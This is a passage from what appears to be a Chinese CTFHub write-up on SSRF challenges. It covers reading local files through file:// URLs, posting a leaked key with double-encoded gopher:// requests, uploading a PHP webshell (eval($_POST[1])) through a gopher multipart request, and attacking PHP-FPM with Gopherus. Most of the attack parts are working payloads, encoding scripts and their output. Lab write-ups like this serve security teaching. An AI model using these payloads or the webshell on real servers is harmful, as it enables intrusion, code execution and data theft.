</span></span><span class=line><span class=cl>curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);   //置cURL在执行时是否应该继续跟随重定向。这里被设置为1，表示允许cURL自动跟随重定向。
</span></span><span class=line><span class=cl>curl_exec($ch);   //执行cURL会话，获取指定URL的内容
</span></span><span class=line><span class=cl>curl_close($ch);   //关闭cURL对话
</span></span></code></pre></div><p><code>?url=file:/var/www/html/flag.php</code></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122693.jpg title=f317e1fdb3df77e82e035053b7436705_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122693.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122693.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122693.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122693.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122693.jpg 2x" sizes=auto alt=f317e1fdb3df77e82e035053b7436705_MD5></a></figure></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>error_reporting(0);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>if ($_SERVER[&#34;REMOTE_ADDR&#34;] != &#34;127.0.0.1&#34;) {
</span></span><span class=line><span class=cl>    echo &#34;Just View From 127.0.0.1&#34;;
</span></span><span class=line><span class=cl>    return;
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$flag=getenv(&#34;CTFHUB&#34;);
</span></span><span class=line><span class=cl>$key = md5($flag);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>if (isset($_POST[&#34;key&#34;]) &amp;&amp; $_POST[&#34;key&#34;] == $key) {
</span></span><span class=line><span class=cl>    echo $flag;
</span></span><span class=line><span class=cl>    exit;
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>?&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;form action=&#34;/flag.php&#34; method=&#34;post&#34;&gt;
</span></span><span class=line><span class=cl>&lt;input type=&#34;text&#34; name=&#34;key&#34;&gt;
</span></span><span class=line><span class=cl>&lt;!-- Debug: key=&lt;?php echo $key;?&gt;--&gt;
</span></span><span class=line><span class=cl>&lt;/form&gt;
</span></span></code></pre></div><p>代码必须要从本地127.0.0.1访问（由于是SSRF，所以不可能是修改XXF这么简单的），我们构造<strong>payload</strong>让目标机从本地访问<code>flag.php</code></p><p><code>?url=[http://127.0.0.1/flag.php](http://127.0.0.1/flag.php)</code></p><p>查看源代码，得到<code>key</code>，但是页面没有提交按钮，需要自己构造POST请求，讲<code>key</code>发送出去，用gopher协议构造POST请求</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122694.jpg title=eb4dedf10769284734dad9f55d3e2bd5_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122694.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122694.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122694.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122694.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122694.jpg 2x" sizes=auto alt=eb4dedf10769284734dad9f55d3e2bd5_MD5></a></figure></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122695.jpg title=4f2efce9d035b55ec03e557e942a0e15_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122695.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122695.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122695.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122695.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122695.jpg 2x" sizes=auto alt=4f2efce9d035b55ec03e557e942a0e15_MD5></a></figure></p><p>题目给了提示，<code>**curl**</code>会跟踪302跳转，这个点主要用于参数长度或内容有限制的时候，可以通过302跳转来实现ssrf。例如，限制了url长度，那么可以在自己的vps或者靶机上，上传构造好的（<code>**Location: gopher://xxxxxxxx**</code>）跳转页面，然后直接访问跳转页面，即可实现ssrf。</p><h3 id=法1手搓 class=headerLink><a href=#%e6%b3%951%e6%89%8b%e6%90%93 class=header-mark></a>法1——手搓</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>gopher://127.0.0.1:80/_POST /flag.php HTTP/1.1
</span></span><span class=line><span class=cl>Host: 127.0.0.1:80
</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded
</span></span><span class=line><span class=cl>Content-Length: 36
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>key=1e2e84bf345d38c316e5541b92c4a925
</span></span></code></pre></div><p>Content-Length: 36就是你需要发送的信息的长度，然后就可以开始编码了，具体进行几次编码取决于你的请求次数</p><p><code>gopher%3A%2F%2F127.0.0.1%3A80%2F_POST%20%2Fflag.php%20HTTP%2F1.1%0AHost%3A%20127.0.0.1%3A80%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0AContent-Length%3A%2036%0A%0Akey%3D1e2e84bf345d38c316e5541b92c4a925</code></p><p>把%0A替换成%0d%0A，结尾加上%0d%0A,并且末尾要加上%0d%0a（\r\n）</p><p><code>gopher%253A%252F%252F127.0.0.1%253A80%252F_POST%2520%252Fflag.php%2520HTTP%252F1.1%250AHost%253A%2520127.0.0.1%253A80%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250AContent-Length%253A%252036%250A%250Akey%253D1e2e84bf345d38c316e5541b92c4a925%0d%0a</code></p><p>然后在进行一次URL编码</p><p><code>gopher%25253A%25252F%25252F127.0.0.1%25253A80%25252F_POST%252520%25252Fflag.php%252520HTTP%25252F1.1%25250AHost%25253A%252520127.0.0.1%25253A80%25250AContent-Type%25253A%252520application%25252Fx-www-form-urlencoded%25250AContent-Length%25253A%25252036%25250A%25250Akey%25253D1e2e84bf345d38c316e5541b92c4a925%250d%250a</code></p><h3 id=法2脚本 class=headerLink><a href=#%e6%b3%952%e8%84%9a%e6%9c%ac class=header-mark></a>法2——脚本</h3><p>直接使用python脚本即可生成符合gopher协议格式的payload</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>import urllib.parse
</span></span><span class=line><span class=cl>payload =\
</span></span><span class=line><span class=cl>&#34;&#34;&#34;POST /flag.php HTTP/1.1
</span></span><span class=line><span class=cl>Host: 127.0.0.1
</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded
</span></span><span class=line><span class=cl>Content-Length: 36
</span></span><span class=line><span class=cl># Content-Length应为字符串“key=1e2e84bf345d38c316e5541b92c4a925”的长度。
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>key=1e2e84bf345d38c316e5541b92c4a925
</span></span><span class=line><span class=cl>&#34;&#34;&#34;  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#注意后面一定要有回车，回车结尾表示http请求结束
</span></span><span class=line><span class=cl>tmp = urllib.parse.quote(payload)
</span></span><span class=line><span class=cl>new = tmp.replace(&#39;%0A&#39;,&#39;%0D%0A&#39;)
</span></span><span class=line><span class=cl>result = &#39;gopher://127.0.0.1:80/&#39;+&#39;_&#39;+new
</span></span><span class=line><span class=cl>result = urllib.parse.quote(result)
</span></span><span class=line><span class=cl>print(result)       
</span></span><span class=line><span class=cl># 这里因为是GET请求所以要进行两次url编码
</span></span></code></pre></div><p><strong>注意：上面那四个参数是POST请求必须的，即POST、Host、Content-Type和Content-Length。如果少了会报错的，而GET则不用。</strong></p><p>得到：<code>gopher%3A//127.0.0.1%3A80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253D1e2e84bf345d38c316e5541b92c4a925%250D%250A</code></p><p>直接抓包放</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122696.jpg title=d0adabf19f13aaac578bddd7cf0f58b5_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122696.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122696.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122696.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122696.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122696.jpg 2x" sizes=auto alt=d0adabf19f13aaac578bddd7cf0f58b5_MD5></a></figure></p><h2 id=ctfhub-ssrf-文件上传 class=headerLink><a href=#ctfhub-ssrf-%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0 class=header-mark></a>CTFHUB SSRF 文件上传</h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122697.jpg title=3dfec7f366452cfd5bb04b3b13e852bb_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122697.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122697.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122697.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122697.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122697.jpg 2x" sizes=auto alt=3dfec7f366452cfd5bb04b3b13e852bb_MD5></a></figure></p><p>扫描目录发现<code>flag.php</code>，读一下</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122698.jpg title=659e3f7ba525bfb4b1334143f596471d_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122698.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122698.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122698.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122698.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122698.jpg 2x" sizes=auto alt=659e3f7ba525bfb4b1334143f596471d_MD5></a></figure></p><p>直接访问不行，必须通过目标机本地访问：</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122699.jpg title=e76e491b4ca94e0c44fcefa471c6de6a_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122699.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122699.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122699.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122699.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122699.jpg 2x" sizes=auto alt=e76e491b4ca94e0c44fcefa471c6de6a_MD5></a></figure></p><p>发现可以文件上传，但是没有提交按钮？？？</p><p>这题和上一题“<strong>POST请求</strong>”其实差不多，只不过上一题用<code>POST</code>方法传递<code>key</code>，这道题用<code>POST</code>方法传递的是文件。</p><p>接着，我们将<code>index.php</code>和<code>flag.php</code>的源码读出来：</p><p><code>?url=file:///var/www/html/index.php</code></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122700.jpg title=48adc2cf77fa3f6467b812654b50fb31_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122700.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122700.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122700.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122700.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122700.jpg 2x" sizes=auto alt=48adc2cf77fa3f6467b812654b50fb31_MD5></a></figure></p><p><code>?url=file:///var/www/html/flag.php</code></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122701.jpg title=92d3676c47784201d91e6666735cec61_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122701.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122701.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122701.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122701.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122701.jpg 2x" sizes=auto alt=92d3676c47784201d91e6666735cec61_MD5></a></figure></p><p>在<code>flag.php</code>页面增加 **提交 **按钮</p><p><code>&lt;input type="submit" name="submit"></code></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122702.jpg title=9bd134ac00649a11352e3da24e468cfd_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122702.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122702.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122702.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122702.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122702.jpg 2x" sizes=auto alt=9bd134ac00649a11352e3da24e468cfd_MD5></a></figure></p><p>传一个马，抓包</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122703.jpg title=c20b874e7d87503d42c441ea8f3757ec_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122703.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122703.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122703.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122703.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122703.jpg 2x" sizes=auto alt=c20b874e7d87503d42c441ea8f3757ec_MD5></a></figure></p><p>将抓到的包内容复制到脚本中，把<code>Host</code>头改成<code>127.0.0.1</code></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122704.jpg title=019d3fd316978a624b592a0845e2bd6f_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122704.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122704.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122704.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122704.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122704.jpg 2x" sizes=auto alt=019d3fd316978a624b592a0845e2bd6f_MD5></a></figure></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>import</span> <span class=nx>urllib</span><span class=o>.</span><span class=nx>parse</span>
</span></span><span class=line><span class=cl><span class=nx>payload</span> <span class=o>=</span><span class=nx>\</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;POST /flag.php HTTP/1.1
</span></span></span><span class=line><span class=cl><span class=s2>Host: 127.0.0.1
</span></span></span><span class=line><span class=cl><span class=s2>Content-Length: 320
</span></span></span><span class=line><span class=cl><span class=s2>Cache-Control: max-age=0
</span></span></span><span class=line><span class=cl><span class=s2>Upgrade-Insecure-Requests: 1
</span></span></span><span class=line><span class=cl><span class=s2>Origin: http://challenge-61c6a1d67a3192e0.sandbox.ctfhub.com:10800
</span></span></span><span class=line><span class=cl><span class=s2>Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfz12DQ4VKPIR9535
</span></span></span><span class=line><span class=cl><span class=s2>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
</span></span></span><span class=line><span class=cl><span class=s2>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
</span></span></span><span class=line><span class=cl><span class=s2>Referer: http://challenge-61c6a1d67a3192e0.sandbox.ctfhub.com:10800/?url=http://127.0.0.1/flag.php
</span></span></span><span class=line><span class=cl><span class=s2>Accept-Encoding: gzip, deflate
</span></span></span><span class=line><span class=cl><span class=s2>Accept-Language: zh-CN,zh;q=0.9
</span></span></span><span class=line><span class=cl><span class=s2>Connection: close
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>------WebKitFormBoundaryfz12DQ4VKPIR9535
</span></span></span><span class=line><span class=cl><span class=s2>Content-Disposition: form-data; name=&#34;</span><span class=nx>file</span><span class=s2>&#34;; filename=&#34;</span><span class=nx>ma</span><span class=o>.</span><span class=nx>php</span><span class=s2>&#34;
</span></span></span><span class=line><span class=cl><span class=s2>Content-Type: application/octet-stream
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>&lt;?php
</span></span></span><span class=line><span class=cl><span class=s2>eval(</span><span class=si>$_POST[1]</span><span class=s2>);
</span></span></span><span class=line><span class=cl><span class=s2>?&gt;
</span></span></span><span class=line><span class=cl><span class=s2>------WebKitFormBoundaryfz12DQ4VKPIR9535
</span></span></span><span class=line><span class=cl><span class=s2>Content-Disposition: form-data; name=&#34;</span><span class=nx>submit</span><span class=s2>&#34;
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>提交
</span></span></span><span class=line><span class=cl><span class=s2>------WebKitFormBoundaryfz12DQ4VKPIR9535--
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#注意后面一定要有回车，回车结尾表示http请求结束
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>tmp</span> <span class=o>=</span> <span class=nx>urllib</span><span class=o>.</span><span class=nx>parse</span><span class=o>.</span><span class=nx>quote</span><span class=p>(</span><span class=nx>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>new</span> <span class=o>=</span> <span class=nx>tmp</span><span class=o>.</span><span class=nx>replace</span><span class=p>(</span><span class=s1>&#39;%0A&#39;</span><span class=p>,</span><span class=s1>&#39;%0D%0A&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>result</span> <span class=o>=</span> <span class=s1>&#39;gopher://127.0.0.1:80/&#39;</span><span class=o>+</span><span class=s1>&#39;_&#39;</span><span class=o>+</span><span class=k>new</span>
</span></span><span class=line><span class=cl><span class=nx>result</span> <span class=o>=</span> <span class=nx>urllib</span><span class=o>.</span><span class=nx>parse</span><span class=o>.</span><span class=nx>quote</span><span class=p>(</span><span class=nx>result</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>print</span><span class=p>(</span><span class=nx>result</span><span class=p>)</span>       <span class=c1># 这里因为是GET请求所以要进行两次url编码
</span></span></span></code></pre></div><p>生成</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>gopher</span><span class=o>%</span><span class=mi>3</span><span class=nx>A</span><span class=c1>//127.0.0.1%3A80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Length%253A%2520320%250D%250ACache-Control%253A%2520max-age%253D0%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AOrigin%253A%2520http%253A//challenge-61c6a1d67a3192e0.sandbox.ctfhub.com%253A10800%250D%250AContent-Type%253A%2520multipart/form-data%253B%2520boundary%253D----WebKitFormBoundaryfz12DQ4VKPIR9535%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%2529%2520AppleWebKit/537.36%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Chrome/119.0.0.0%2520Safari/537.36%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252Cimage/apng%252C%252A/%252A%253Bq%253D0.8%252Capplication/signed-exchange%253Bv%253Db3%253Bq%253D0.7%250D%250AReferer%253A%2520http%253A//challenge-61c6a1d67a3192e0.sandbox.ctfhub.com%253A10800/%253Furl%253Dhttp%253A//127.0.0.1/flag.php%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%250D%250AConnection%253A%2520close%250D%250A%250D%250A------WebKitFormBoundaryfz12DQ4VKPIR9535%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%2522ma.php%2522%250D%250AContent-Type%253A%2520application/octet-stream%250D%250A%250D%250A%253C%253Fphp%250D%250Aeval%2528%2524_POST%255B1%255D%2529%253B%250D%250A%253F%253E%250D%250A------WebKitFormBoundaryfz12DQ4VKPIR9535%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522submit%2522%250D%250A%250D%250A%25E6%258F%2590%25E4%25BA%25A4%250D%250A------WebKitFormBoundaryfz12DQ4VKPIR9535--%250D%250A%250D%250A
</span></span></span></code></pre></div><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122705.jpg title=c96aaafd663e14244a66a92c3e09bea4_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122705.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122705.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122705.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122705.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122705.jpg 2x" sizes=auto alt=c96aaafd663e14244a66a92c3e09bea4_MD5></a></figure></p><h2 id=ctfhub-ssrf-fastcgi协议 class=headerLink><a href=#ctfhub-ssrf-fastcgi%e5%8d%8f%e8%ae%ae class=header-mark></a>CTFHUB SSRF FastCGI协议</h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122706.jpg title=ac6ec1d313bbb7bd542620c7470541d0_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122706.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122706.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122706.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122706.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122706.jpg 2x" sizes=auto alt=ac6ec1d313bbb7bd542620c7470541d0_MD5></a></figure></p><p><a href=https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html target=_blank rel="noopener noreferrer">Fastcgi协议分析 && PHP-FPM未授权访问漏洞 && Exp编写</a></p><blockquote><p><strong>FastCGI</strong></p><p>Wikipedia对FastCGI的解释：<strong>快速通用网关接口</strong>（<strong>Fast****C</strong>ommon <strong>G</strong>ateway <strong>I</strong>nterface／<strong>FastCGI</strong>）是一种<strong>让交互程序与Web服务器通信的协议</strong>。FastCGI是早期通用网关接口（CGI）的增强版本。FastCGI致力于减少网页服务器与CGI程序之间交互的开销，从而使服务器可以同时处理更多的网页请求。</p><p><strong>php-fpm</strong></p><p>官方对php-fpm的解释是<strong>FPM（FastCGI 进程管理器）用于替换 PHP FastCGI 的大部分附加功能，对于高负载网站是非常有用的。<strong>也就是说</strong>php-fpm是FastCGI的一个具体实现</strong>，其默认监听9000端口。</p><p><strong>php-fpm攻击实现原理</strong></p><p>想要分析它的攻击原理需要从FastCGI协议封装数据内容来看，这里仅对攻击原理做简要描述，<a href=https://www.cnblogs.com/itbsl/p/9828776.html target=_blank rel="noopener noreferrer">CGI 和 FastCGI 协议的运行原理</a>这篇文章中详细介绍了FastCGI协议的内容，其攻击原理就是在设置环境变量实际请求中会出现一个SCRIPT_FILENAME&rsquo;: &lsquo;/var/www/html/index.php这样的键值对，它的意思是php-fpm会执行这个文件，但是这样即使能够控制这个键值对的值，但也只能控制php-fpm去执行某个已经存在的文件，不能够实现一些恶意代码的执行。</p><p>而在php5.3.9后来的版本中，php增加了安全选项导致只能控制php-fpm执行一些php、php4这样的文件，这也增大了攻击的难度。但是好在php官方允许通过PHP_ADMIN_VALUE和PHP_VALUE去动态修改php的设置。</p><p>那么当设置php环境变量为：auto_prepend_file = php://input;allow_url_include = On时，就会在执行php脚本之前包含环境变量auto_prepend_file所指向的文件内容，php://input也就是接收POST的内容，这个我们可以在FastCGI协议的body控制为恶意代码，这样就在理论上实现了php-fpm任意代码执行的攻击。</p><p>详情请看：<a href=https://bbs.ichunqiu.com/thread-58455-1-1.html target=_blank rel="noopener noreferrer">https://bbs.ichunqiu.com/thread-58455-1-1.html</a></p></blockquote><p>接下来，我们使用 <a href=https://github.com/tarunkant/Gopherus target=_blank rel="noopener noreferrer">Gopherus</a>工具生成攻击FastCGI的payload。</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122707.jpg title=f16536e9bbc2ee7b1b70fd499c9c0f83_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122707.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122707.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122707.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122707.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122707.jpg 2x" sizes=auto alt=f16536e9bbc2ee7b1b70fd499c9c0f83_MD5></a></figure></p><blockquote><p>利用条件：</p><ul><li>libcurl版本>=7.45.0</li><li>PHP-FPM监听端口</li><li>PHP-FPM版本 >= 5.3.3</li><li>知道服务器上任意一个php文件的绝对路径</li></ul></blockquote><p>攻击协议：<code>python gopherus.py --exploit fastcgi</code>明确攻击协议，然后构造访问用的playload</p><p>文件：<code>/var/www/html/index.php</code>/<code>index.php</code>输入一个已知存在的php文件</p><p>命令执行：<code>cat /*</code>查看根目录下所有文件</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122708.jpg title=81ec4d09419fae680fca1b04163c0076_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122708.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122708.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122708.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122708.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122708.jpg 2x" sizes=auto 